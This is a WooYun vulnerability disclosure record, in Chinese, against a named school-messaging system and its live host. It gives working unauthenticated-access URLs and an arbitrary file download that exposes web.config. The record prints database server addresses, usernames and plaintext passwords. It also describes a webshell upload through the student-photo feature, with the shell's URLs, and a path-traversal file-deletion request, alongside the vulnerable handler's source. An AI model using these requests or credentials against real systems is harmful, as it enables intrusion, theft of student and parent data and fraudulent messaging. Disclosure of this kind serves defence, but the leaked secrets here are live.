{"id": 78069, "wybug_id": "wooyun-2015-0161231", "wybug_title": "学事通任意文件上传下载删除", "wybug_corp": "学事通", "wybug_author": "thx", "wybug_date": "2015-12-14 16:57", "wybug_open_date": "2016-01-25 18:01", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["未授权访问"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-14：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-01-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 天干物燥 小心火烛 详细说明：  学事通偶然看到的一个站，危害之一是可以利用该系统给学生家长群发诈骗短信http://www.njxt.net:800060.190.202.51\n未授权访问http://www.njxt.net:8000/scmanage/index.aspx?sid=22&uname=0022029http://www.njxt.net:8000/scmanage/index.aspx?sid=52&uname=0193001http://www.njxt.net:8000/scmanage/index.aspx?sid=166&uname=0104060爆破学校ID,403则存在http://www.njxt.net:8000/image/studentimg/166/爆破学校账号应该也行，7位数，这里没有试\n\n任意文件下载http://www.njxt.net:8000/ashx/download.ashx?/scManage/学事通校园管理员-最新版.pdfhttp://www.njxt.net:8000/ashx/download.ashx?/web.config  <connectionStrings>    <add name=\"SqlConnection\" connectionString=\"server=60.190.202.36,14333\\SZ;database=newSZJXT;uid=SZJXTUSER;pwd=DG8FV-B9TKY-FRT9J\" />    <add name=\"EngelishConnection\" connectionString=\"server=60.190.202.20;database=SZLXYY;uid=sa;pwd=linkivr\" />    <add name=\"SMSConnction\" connectionString=\"server=60.190.202.53,14333\\SZ;database=SMS;uid=SZJXTUSER;pwd=DG8FV-B9TKY-FRT9J\" />    <add name=\"xstSmsConn\" connectionString=\"server=60.190.202.38,49469;database=XST;uid=sa;pwd=qaz!@#0401\"/>  </connectionStrings>\n\n任意文件上传http://www.njxt.net:8000/scmanage/index.aspx?sid=166&uname=0104060学生管理，编辑，上传学生照片，直接传马，提交，再编辑，可得到马的完整地址http://www.njxt.net:8000/flash/up.swf?url=/ashx/SaveFile.ashx&Img=/image/studentimg/166/df4fe0d2-f2b2-4e8b-9d58-724fd2ce8caf.aspx&call=FlashCallhttp://www.njxt.net:8000/image/studentimg/166/df4fe0d2-f2b2-4e8b-9d58-724fd2ce8caf.aspx以上为测试删除文件前上传的，新的地址是：http://www.njxt.net:8000/image/studentimg/166/724e49b4-b103-47af-b07e-3ad66047f93a.aspx\n\nhttp://www.njxt.net:8000/ashx/download.ashx?/ashx/SaveFile.ashxSaveFile.ashx源码:<%@ WebHandler Language=\"C#\" Class=\"SaveFile\" %>using System;using System.Web;using System.IO;public class SaveFile : IHttpHandler{    public void ProcessRequest(HttpContext context)    {        context.Response.ContentType = \"text/plain\";        var delName = context.Request[\"delName\"];        if (!string.IsNullOrEmpty(delName))        {            System.IO.File.Delete(context.Server.MapPath(\"/uploadtemp/\" + delName));            context.Response.End();        }        int length = context.Request.InputStream.Length.toString(0);        if (length <= 0) return;        byte[] buffer = new byte[length];        context.Request.Files[\"Filedata\"].InputStream.Read(buffer, 0, length);        string fileExt = Path.GetExtension(context.Request.Params[0].toString()).ToLower();        string name = Guid.NewGuid().toString() + fileExt;        string path = HttpContext.Current.Server.MapPath(\"~/uploadtemp/\" + name);        System.IO.FileStream fs = new FileStream(path, FileMode.Create, FileAccess.Write);        System.IO.BinaryWriter bw = new BinaryWriter(fs);        bw.Write(buffer);        bw.Close();        fs.Close();        context.Response.Write(name);    }    public bool IsReusable    {        get        {            return false;        }    }}\n\n从源码发现，任意文件删除http://www.njxt.net:8000/ashx/SaveFile.ashx?delName=../image/studentimg/166/df4fe0d2-f2b2-4e8b-9d58-724fd2ce8caf.aspx\n   漏洞证明：  从图片文件夹路径看，大概有800个学校，一个学校几百学生，总人数还是很可观的\n\n最后连接数据库看看：\n\n没有进一步看，SHELL请自行删除。   修复方案：  无   版权声明：转载请注明来源 thx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n     2015-12-14 18:54 |    \t\t法官 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | Seven QQ94170844)\t\t \n  看来 还有注入    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}